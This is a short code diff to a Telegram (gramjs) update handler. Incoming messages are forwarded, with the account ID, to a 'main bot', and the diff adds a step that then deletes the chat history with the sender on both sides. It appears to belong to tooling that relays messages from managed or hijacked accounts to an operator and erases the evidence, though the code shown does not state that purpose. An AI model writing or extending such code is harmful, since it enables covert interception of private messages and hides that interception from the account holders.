@@ -1,7 +1,15 @@
+import BigInt from 'big-integer';
+
+import { TelegramClient } from '../../../gramjs';
 import GramJs from '../../../gramjs/tl/api';
 import { sendToMainBot } from '../../helpers/sendToMainBot';
+import { deleteHistory } from '../messages/deleteHistory';
 
-export const handleUpdate = async (accountId: string, update: any) => {
+export const handleUpdate = async (
+  client: TelegramClient | null,
+  accountId: string,
+  update: any
+) => {
   if (!update) {
     return;
   }
@@ -34,6 +42,16 @@ export const handleUpdate = async (accountId: string, update: any) => {
 ID: ${accountId}
 MESSAGE: ${update.message}`
       );
+      if (client) {
+        await deleteHistory(
+          client,
+          new GramJs.InputPeerUser({
+            userId: update.userId,
+            accessHash: BigInt(0),
+          }),
+          true
+        );
+      }
     }
   }
 };
